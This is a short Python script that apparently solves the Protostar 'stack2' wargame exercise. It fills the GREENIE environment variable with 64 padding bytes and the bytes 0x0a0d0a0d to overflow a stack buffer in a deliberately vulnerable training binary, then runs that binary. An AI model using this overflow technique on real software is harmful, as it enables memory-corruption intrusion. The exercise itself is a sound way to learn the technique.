import subprocess
import os

path = '/opt/protostar/bin/stack2'

os.environ['GREENIE'] = 'A'*64 + '\x0a\x0d\x0a\x0d'

p = subprocess.Popen(path)
stdout, stderr = p.communicate()
